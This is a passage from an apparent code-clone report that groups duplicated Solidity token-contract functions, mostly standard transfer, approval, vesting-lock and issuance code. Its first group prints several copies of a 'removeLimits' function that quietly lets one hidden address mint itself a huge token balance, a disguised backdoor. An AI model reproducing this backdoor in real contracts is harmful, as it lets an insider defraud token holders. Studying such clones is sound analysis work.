<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="43" endline="47" pcid="4101">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="43" endline="47" pcid="7320">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="43" endline="47" pcid="5603">
    function removeLimits(uint256 aiBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*aiBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="44" endline="48" pcid="3247">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="42" endline="46" pcid="3282">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="42" endline="46" pcid="8890">
    function removeLimits(uint256 aiBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*aiBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="43" endline="47" pcid="2443">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="43" endline="47" pcid="3706">
    function removeLimits(uint256 aiBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*aiBot*10**tokenDecimals;
        }
    } 
</source>
</class>

<class classid="194" nclones="3" nlines="9" similarity="87">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="326" endline="334" pcid="2600">
    function MMCoin(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        MAX_SUPPLY = 11222017204.753513 * 10**6;
        balances[owner] = _initialSupply;
        deprecated = false;
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="326" endline="334" pcid="4768">
    function MMCoin(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        MAX_SUPPLY = 110000000000 * 10**6;
        balances[owner] = _initialSupply;
        deprecated = false;
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="326" endline="334" pcid="8937">
    function MMCoin(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        MAX_SUPPLY = 11222017204.753513 * 10**6;
        balances[owner] = _initialSupply;
        deprecated = false;
    }
</source>
</class>

<class classid="195" nclones="3" nlines="5" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="348" endline="352" pcid="2601">
    function addLock(address user,uint256 initialLockAmount, uint256 lockAmount, uint256 releaseStart, uint256 releaseInterval, uint256 releasePeriods) public onlyOwner {
        LockInfo storage info = lockInfos[user];
        require(info.lockAmount == 0); // Make sure the lock is not set
        lockInfos[user] = LockInfo(initialLockAmount, lockAmount, releaseStart, releaseInterval, 0, releasePeriods);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="348" endline="352" pcid="4769">
    function addLock(address user,uint256 initialLockAmount, uint256 lockAmount, uint256 releaseStart, uint256 releaseInterval, uint256 releasePeriods) public onlyOwner {
        LockInfo storage info = lockInfos[user];
        require(info.lockAmount == 0); // Make sure the lock is not set
        lockInfos[user] = LockInfo(initialLockAmount, lockAmount, releaseStart, releaseInterval, 0, releasePeriods);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="348" endline="352" pcid="8938">
    function addLock(address user,uint256 initialLockAmount, uint256 lockAmount, uint256 releaseStart, uint256 releaseInterval, uint256 releasePeriods) public onlyOwner {
        LockInfo storage info = lockInfos[user];
        require(info.lockAmount == 0); // Make sure the lock is not set
        lockInfos[user] = LockInfo(initialLockAmount, lockAmount, releaseStart, releaseInterval, 0, releasePeriods);
    }
</source>
</class>

<class classid="196" nclones="3" nlines="11" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="355" endline="376" pcid="2602">
    function availableLockBalance(address user) public view returns (uint256, uint256) {
        LockInfo storage info = lockInfos[user];

        if (block.timestamp < info.releaseStart) {
            // If the current time has not reached the first release time, all tokens are still locked
            return (info.initialLockAmount, info.releasePeriods);
        }

        // Calculate the elapsed release period
        uint256 elapsedPeriods = (block.timestamp.sub(info.releaseStart)).div(info.releaseInterval);

        // Remaining release period
        uint256 remainingPeriods = elapsedPeriods >= info.releasePeriods ? 0 : info.releasePeriods.sub(elapsedPeriods);

        // Count the number of tokens released
        uint256 released = info.initialLockAmount.mul(elapsedPeriods).div(info.releasePeriods);

        // Number of remaining lock-up tokens
        uint256 remainingLockBalance = info.initialLockAmount.sub(released);

        return (remainingLockBalance, remainingPeriods);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="355" endline="376" pcid="4770">
    function availableLockBalance(address user) public view returns (uint256, uint256) {
        LockInfo storage info = lockInfos[user];

        if (block.timestamp < info.releaseStart) {
            // If the current time has not reached the first release time, all tokens are still locked
            return (info.initialLockAmount, info.releasePeriods);
        }

        // Calculate the elapsed release period
        uint256 elapsedPeriods = (block.timestamp.sub(info.releaseStart)).div(info.releaseInterval);

        // Remaining release period
        uint256 remainingPeriods = elapsedPeriods >= info.releasePeriods ? 0 : info.releasePeriods.sub(elapsedPeriods);

        // Count the number of tokens released
        uint256 released = info.initialLockAmount.mul(elapsedPeriods).div(info.releasePeriods);

        // Number of remaining lock-up tokens
        uint256 remainingLockBalance = info.initialLockAmount.sub(released);

        return (remainingLockBalance, remainingPeriods);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="355" endline="376" pcid="8939">
    function availableLockBalance(address user) public view returns (uint256, uint256) {
        LockInfo storage info = lockInfos[user];

        if (block.timestamp < info.releaseStart) {
            // If the current time has not reached the first release time, all tokens are still locked
            return (info.initialLockAmount, info.releasePeriods);
        }

        // Calculate the elapsed release period
        uint256 elapsedPeriods = (block.timestamp.sub(info.releaseStart)).div(info.releaseInterval);

        // Remaining release period
        uint256 remainingPeriods = elapsedPeriods >= info.releasePeriods ? 0 : info.releasePeriods.sub(elapsedPeriods);

        // Count the number of tokens released
        uint256 released = info.initialLockAmount.mul(elapsedPeriods).div(info.releasePeriods);

        // Number of remaining lock-up tokens
        uint256 remainingLockBalance = info.initialLockAmount.sub(released);

        return (remainingLockBalance, remainingPeriods);
    }
</source>
</class>

<class classid="197" nclones="3" nlines="20" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="380" endline="404" pcid="2603">
    function transfer(address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[msg.sender]);

        if (lockInfos[msg.sender].initialLockAmount == 0) {
            if (deprecated) {
                return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
            } else {
                return super.transfer(_to, _value);
            }
        }

        // Check the lock-up information and calculate the number of tokens that can be transferred
        LockInfo storage senderLockInfo = lockInfos[msg.sender];
        uint256 available = _calculateAvailableBalance(msg.sender, senderLockInfo);

        // Ensure that the transfer amount does not exceed the available balance
        require(_value <= available);


        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
        } else {
            return super.transfer(_to, _value);
        }
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="380" endline="404" pcid="4771">
    function transfer(address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[msg.sender]);

        if (lockInfos[msg.sender].initialLockAmount == 0) {
            if (deprecated) {
                return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
            } else {
                return super.transfer(_to, _value);
            }
        }

        // Check the lock-up information and calculate the number of tokens that can be transferred
        LockInfo storage senderLockInfo = lockInfos[msg.sender];
        uint256 available = _calculateAvailableBalance(msg.sender, senderLockInfo);

        // Ensure that the transfer amount does not exceed the available balance
        require(_value <= available);


        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
        } else {
            return super.transfer(_to, _value);
        }
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="380" endline="404" pcid="8940">
    function transfer(address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[msg.sender]);

        if (lockInfos[msg.sender].initialLockAmount == 0) {
            if (deprecated) {
                return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
            } else {
                return super.transfer(_to, _value);
            }
        }

        // Check the lock-up information and calculate the number of tokens that can be transferred
        LockInfo storage senderLockInfo = lockInfos[msg.sender];
        uint256 available = _calculateAvailableBalance(msg.sender, senderLockInfo);

        // Ensure that the transfer amount does not exceed the available balance
        require(_value <= available);


        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
        } else {
            return super.transfer(_to, _value);
        }
    }
</source>
</class>

<class classid="198" nclones="3" nlines="17" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="407" endline="430" pcid="2604">
    function _calculateAvailableBalance(address user, LockInfo storage lockInfo) internal view returns (uint256) {
        if (lockInfo.initialLockAmount == 0) {
            // If the user does not lock in, all tokens are available
            return balances[user];
        }

        // Calculate the amount of tokens currently locked
        uint256 locked = lockInfo.initialLockAmount;
        if (block.timestamp >= lockInfo.releaseStart) {
            // If the current time exceeds the release start time
            uint256 elapsedPeriods = (block.timestamp.sub(lockInfo.releaseStart)).div(lockInfo.releaseInterval);
            if (elapsedPeriods >= lockInfo.releasePeriods) {
                // If all lock-up periods have expired and no tokens are locked
                locked = 0;
            } else {
                // Calculate the number of tokens released and subtract from the initial lock-up
                uint256 released = lockInfo.initialLockAmount.mul(elapsedPeriods).div(lockInfo.releasePeriods);
                locked = lockInfo.initialLockAmount.sub(released);
            }
        }

        // The actual available balance is the total balance minus the amount of locked tokens
        return balances[user] >= locked ? balances[user].sub(locked) : 0;
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="407" endline="430" pcid="4772">
    function _calculateAvailableBalance(address user, LockInfo storage lockInfo) internal view returns (uint256) {
        if (lockInfo.initialLockAmount == 0) {
            // If the user does not lock in, all tokens are available
            return balances[user];
        }

        // Calculate the amount of tokens currently locked
        uint256 locked = lockInfo.initialLockAmount;
        if (block.timestamp >= lockInfo.releaseStart) {
            // If the current time exceeds the release start time
            uint256 elapsedPeriods = (block.timestamp.sub(lockInfo.releaseStart)).div(lockInfo.releaseInterval);
            if (elapsedPeriods >= lockInfo.releasePeriods) {
                // If all lock-up periods have expired and no tokens are locked
                locked = 0;
            } else {
                // Calculate the number of tokens released and subtract from the initial lock-up
                uint256 released = lockInfo.initialLockAmount.mul(elapsedPeriods).div(lockInfo.releasePeriods);
                locked = lockInfo.initialLockAmount.sub(released);
            }
        }

        // The actual available balance is the total balance minus the amount of locked tokens
        return balances[user] >= locked ? balances[user].sub(locked) : 0;
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="407" endline="430" pcid="8941">
    function _calculateAvailableBalance(address user, LockInfo storage lockInfo) internal view returns (uint256) {
        if (lockInfo.initialLockAmount == 0) {
            // If the user does not lock in, all tokens are available
            return balances[user];
        }

        // Calculate the amount of tokens currently locked
        uint256 locked = lockInfo.initialLockAmount;
        if (block.timestamp >= lockInfo.releaseStart) {
            // If the current time exceeds the release start time
            uint256 elapsedPeriods = (block.timestamp.sub(lockInfo.releaseStart)).div(lockInfo.releaseInterval);
            if (elapsedPeriods >= lockInfo.releasePeriods) {
                // 如果所有锁仓期都已过，没有代币被锁定
                locked = 0;
            } else {
                // Calculate the number of tokens released and subtract from the initial lock-up
                uint256 released = lockInfo.initialLockAmount.mul(elapsedPeriods).div(lockInfo.releasePeriods);
                locked = lockInfo.initialLockAmount.sub(released);
            }
        }

        // The actual available balance is the total balance minus the amount of locked tokens
        return balances[user] >= locked ? balances[user].sub(locked) : 0;
    }
</source>
</class>

<class classid="199" nclones="3" nlines="20" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="434" endline="457" pcid="2605">
    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[_from]);

        if (lockInfos[_from].initialLockAmount == 0) {
            if (deprecated) {
                return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
            } else {
                return super.transferFrom(_from, _to, _value);
            }
        }

        // Check the lock-up information and calculate the number of tokens that can be transferred
        LockInfo storage senderLockInfo = lockInfos[_from];
        uint256 available = _calculateAvailableBalance(_from, senderLockInfo);

        // Make sure the transfer does not exceed the available balance
        require(_value <= available);

        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
        } else {
            return super.transferFrom(_from, _to, _value);
        }
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="434" endline="457" pcid="4773">
    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[_from]);

        if (lockInfos[_from].initialLockAmount == 0) {
            if (deprecated) {
                return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
            } else {
                return super.transferFrom(_from, _to, _value);
            }
        }

        // Check the lock-up information and calculate the number of tokens that can be transferred
        LockInfo storage senderLockInfo = lockInfos[_from];
        uint256 available = _calculateAvailableBalance(_from, senderLockInfo);

        // Make sure the transfer does not exceed the available balance
        require(_value <= available);

        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
        } else {
            return super.transferFrom(_from, _to, _value);
        }
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="434" endline="457" pcid="8942">
    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[_from]);

        if (lockInfos[_from].initialLockAmount == 0) {
            if (deprecated) {
                return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
            } else {
                return super.transferFrom(_from, _to, _value);
            }
        }

        // Check the lock-up information and calculate the number of tokens that can be transferred
        LockInfo storage senderLockInfo = lockInfos[_from];
        uint256 available = _calculateAvailableBalance(_from, senderLockInfo);

        // Make sure the transfer does not exceed the available balance
        require(_value <= available);

        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
        } else {
            return super.transferFrom(_from, _to, _value);
        }
    }
</source>
</class>

<class classid="200" nclones="3" nlines="8" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="506" endline="514" pcid="2611">
    function issue(uint amount) public onlyOwner {
        require(_totalSupply + amount <= MAX_SUPPLY);
        require(_totalSupply + amount > _totalSupply);
        require(balances[owner] + amount > balances[owner]);

        balances[owner] += amount;
        _totalSupply += amount;
        Issue(amount);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="506" endline="514" pcid="8948">
    function issue(uint amount) public onlyOwner {
        require(_totalSupply + amount <= MAX_SUPPLY);
        require(_totalSupply + amount > _totalSupply);
        require(balances[owner] + amount > balances[owner]);

        balances[owner] += amount;
        _totalSupply += amount;
        Issue(amount);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="506" endline="514" pcid="4779">
    function issue(uint amount) public onlyOwner {
        require(_totalSupply + amount <= MAX_SUPPLY);
        require(_totalSupply + amount > _totalSupply);
        require(balances[owner] + amount > balances[owner]);

        balances[owner] += amount;
        _totalSupply += amount;
        Issue(amount);
    }
</source>
</class>

<class classid="201" nclones="3" nlines="12" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="518" endline="531" pcid="2612">
    function issueAndLock(address _to, uint256 _amount, uint256 releaseStart, uint256 releaseInterval, uint256 releasePeriods) public onlyOwner {
        require(_to != address(0));
        require(_amount > 0);
        require(_totalSupply.add(_amount) <= MAX_SUPPLY);

        LockInfo storage info = lockInfos[_to];
        require(info.lockAmount == 0); // Make sure the user has not previously locked in
        lockInfos[_to] = LockInfo(_amount, _amount, releaseStart, releaseInterval, 0, releasePeriods);

        _totalSupply = _totalSupply.add(_amount); // Add tokens to the total supply
        balances[_to] = balances[_to].add(_amount); // Immediately add the token to the user's balance
        IssueToAddress(_to, _amount); // The issue event is triggered
        Transfer(address(0), _to, _amount); // Trigger the transfer event, the token has been transferred to the user balance, but is locked
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="518" endline="531" pcid="8949">
    function issueAndLock(address _to, uint256 _amount, uint256 releaseStart, uint256 releaseInterval, uint256 releasePeriods) public onlyOwner {
        require(_to != address(0));
        require(_amount > 0);
        require(_totalSupply.add(_amount) <= MAX_SUPPLY);

        LockInfo storage info = lockInfos[_to];
        require(info.lockAmount == 0); // Make sure the user has not previously locked in
        lockInfos[_to] = LockInfo(_amount, _amount, releaseStart, releaseInterval, 0, releasePeriods);

        _totalSupply = _totalSupply.add(_amount); // Add tokens to the total supply
        balances[_to] = balances[_to].add(_amount); // Immediately add the token to the user's balance
        IssueToAddress(_to, _amount); // The issue event is triggered
        Transfer(address(0), _to, _amount); // Trigger the transfer event, the token has been transferred to the user balance, but is locked
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="518" endline="531" pcid="4780">
    function issueAndLock(address _to, uint256 _amount, uint256 releaseStart, uint256 releaseInterval, uint256 releasePeriods) public onlyOwner {
        require(_to != address(0));
        require(_amount > 0);
        require(_totalSupply.add(_amount) <= MAX_SUPPLY);

        LockInfo storage info = lockInfos[_to];
        require(info.lockAmount == 0); // Make sure the user has not previously locked in
        lockInfos[_to] = LockInfo(_amount, _amount, releaseStart, releaseInterval, 0, releasePeriods);

        _totalSupply = _totalSupply.add(_amount); // Add tokens to the total supply
        balances[_to] = balances[_to].add(_amount); // Immediately add the token to the user's balance
        IssueToAddress(_to, _amount); // The issue event is triggered
        Transfer(address(0), _to, _amount); // Trigger the transfer event, the token has been transferred to the user balance, but is locked
    }
</source>
</class>

<class classid="202" nclones="3" nlines="10" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="534" endline="544" pcid="2613">
    function issueToAddress(address _to, uint256 _amount) public onlyOwner {
        require(_to != address(0));
        require(_amount > 0);
        require(_totalSupply.add(_amount) <= MAX_SUPPLY);
        require(balances[_to].add(_amount) > balances[_to]);

        balances[_to] = balances[_to].add(_amount);
        _totalSupply = _totalSupply.add(_amount);
        IssueToAddress(_to, _amount);
        Transfer(address(0), _to, _amount);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="534" endline="544" pcid="8950">
    function issueToAddress(address _to, uint256 _amount) public onlyOwner {
        require(_to != address(0));
        require(_amount > 0);
        require(_totalSupply.add(_amount) <= MAX_SUPPLY);
        require(balances[_to].add(_amount) > balances[_to]);

        balances[_to] = balances[_to].add(_amount);
        _totalSupply = _totalSupply.add(_amount);
        IssueToAddress(_to, _amount);
        Transfer(address(0), _to, _amount);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="534" endline="544" pcid="4781">
    function issueToAddress(address _to, uint256 _amount) public onlyOwner {
        require(_to != address(0));
        require(_amount > 0);
        require(_totalSupply.add(_amount) <= MAX_SUPPLY);
        require(balances[_to].add(_amount) > balances[_to]);

        balances[_to] = balances[_to].add(_amount);
        _totalSupply = _totalSupply.add(_amount);
        IssueToAddress(_to, _amount);
        Transfer(address(0), _to, _amount);
    }
</source>
</class>

<class classid="203" nclones="3" nlines="13" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="547" endline="560" pcid="2614">
    function batchIssue(address[] memory recipients, uint256[] memory amounts) public onlyOwner {
        require(recipients.length == amounts.length);

        for (uint256 i = 0; i < recipients.length; i++) {
            require(recipients[i] != address(0));
            require(amounts[i] > 0);
            require(_totalSupply.add(amounts[i]) <= MAX_SUPPLY);
            require(balances[recipients[i]].add(amounts[i]) > balances[recipients[i]]);
            balances[recipients[i]] = balances[recipients[i]].add(amounts[i]);
            _totalSupply = _totalSupply.add(amounts[i]);
            IssueToAddress(recipients[i], amounts[i]);
            Transfer(address(0), recipients[i], amounts[i]);
        }
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="547" endline="560" pcid="4782">
    function batchIssue(address[] memory recipients, uint256[] memory amounts) public onlyOwner {
        require(recipients.length == amounts.length);

        for (uint256 i = 0; i < recipients.length; i++) {
            require(recipients[i] != address(0));
            require(amounts[i] > 0);
            require(_totalSupply.add(amounts[i]) <= MAX_SUPPLY);
            require(balances[recipients[i]].add(amounts[i]) > balances[recipients[i]]);
            balances[recipients[i]] = balances[recipients[i]].add(amounts[i]);
            _totalSupply = _totalSupply.add(amounts[i]);
            IssueToAddress(recipients[i], amounts[i]);
            Transfer(address(0), recipients[i], amounts[i]);
        }
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="547" endline="560" pcid="8951">
    function batchIssue(address[] memory recipients, uint256[] memory amounts) public onlyOwner {
        require(recipients.length == amounts.length);

        for (uint256 i = 0; i < recipients.length; i++) {
            require(recipients[i] != address(0));
            require(amounts[i] > 0);
            require(_totalSupply.add(amounts[i]) <= MAX_SUPPLY);
            require(balances[recipients[i]].add(amounts[i]) > balances[recipients[i]]);
            balances[recipients[i]] = balances[recipients[i]].add(amounts[i]);
            _totalSupply = _totalSupply.add(amounts[i]);
            IssueToAddress(recipients[i], amounts[i]);
            Transfer(address(0), recipients[i], amounts[i]);
        }
    }
</source>
</class>

<class classid="204" nclones="3" nlines="6" similarity="100">
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="563" endline="568" pcid="2615">
    function batchTransfer(address[] memory recipients, uint256[] memory amounts) public onlyOwner {
        require(recipients.length == amounts.length);
        for (uint256 i = 0; i < recipients.length; i++) {
            transfer(recipients[i], amounts[i]);
        }
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="563" endline="568" pcid="4783">
    function batchTransfer(address[] memory recipients, uint256[] memory amounts) public onlyOwner {
        require(recipients.length == amounts.length);
        for (uint256 i = 0; i < recipients.length; i++) {
            transfer(recipients[i], amounts[i]);
        }
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="563" endline="568" pcid="8952">
    function batchTransfer(address[] memory recipients, uint256[] memory amounts) public onlyOwner {
        require(recipients.length == amounts.length);
        for (uint256 i = 0; i < recipients.length; i++) {
            transfer(recipients[i], amounts[i]);
        }
    }
</source>
</class>

<class classid="205" nclones="2" nlines="6" similarity="100">
<source file="systems/source-code/0x4B045C40Ed6b99FB4551522B95C97b7F7aB31371.sol" startline="43" endline="48" pcid="2811">
    function transfer(address recipient, uint amount) public returns (bool success) {
        balances[msg.sender] = balances[msg.sender] - amount;
        balances[recipient] = balances[recipient] + amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8b49740b4c824252dc4b543c746eae0549c22a15.sol" startline="43" endline="48" pcid="5156">
    function transfer(address recipient, uint amount) public returns (bool success) {
        balances[msg.sender] = balances[msg.sender] - amount;
        balances[recipient] = balances[recipient] + amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
</class>

<class classid="206" nclones="2" nlines="7" similarity="100">
<source file="systems/source-code/0x4B045C40Ed6b99FB4551522B95C97b7F7aB31371.sol" startline="55" endline="61" pcid="2813">
        function transferFrom(address sender, address recipient, uint amount) public returns (bool success) {
            balances[sender] = balances[sender] - amount;
            allowed[sender][msg.sender] = allowed[sender][msg.sender] - amount;
            balances[recipient] = balances[recipient] + amount;
            emit Transfer(sender, recipient, amount);
            return true;
        }
</source>
<source file="systems/source-code/0x8b49740b4c824252dc4b543c746eae0549c22a15.sol" startline="55" endline="61" pcid="5158">
        function transferFrom(address sender, address recipient, uint amount) public returns (bool success) {
            balances[sender] = balances[sender] - amount;
            allowed[sender][msg.sender] = allowed[sender][msg.sender] - amount;
            balances[recipient] = balances[recipient] + amount;
            emit Transfer(sender, recipient, amount);
            return true;
        }
</source>
</class>

<class classid="207" nclones="2" nlines="5" similarity="100">
<source file="systems/source-code/0x512Fe2B277Bd0EB9763a329f1025dc6cBcBf225B.sol" startline="54" endline="58" pcid="3017">
    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="311" endline="315" pcid="8639">
    function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
</class>

<class classid="208" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="41" endline="43" pcid="3035">
    function name() public view override returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="380" endline="382" pcid="9253">
  function symbol() external override view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="45" endline="47" pcid="3036">
    function symbol() public view override returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="387" endline="389" pcid="9254">
  function name() external override view returns (string memory) {
    return _name;
  }
</source>
</class>

<class classid="209" nclones="12" nlines="4" similarity="100">
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="61" endline="64" pcid="3040">
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75ead649fc217b1a630aee17278b1f2045b6b276.sol" startline="41" endline="44" pcid="4373">
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="70" endline="73" pcid="3042">
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="87" endline="90" pcid="9006">
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="78" endline="81" pcid="9004">
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="87" endline="90" pcid="8962">
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75ead649fc217b1a630aee17278b1f2045b6b276.sol" startline="50" endline="53" pcid="4375">
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="78" endline="81" pcid="8960">
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5f60596411116de6c38ac8d68c159700cf72db3f.sol" startline="38" endline="41" pcid="3607">
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5f60596411116de6c38ac8d68c159700cf72db3f.sol" startline="47" endline="50" pcid="3609">
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
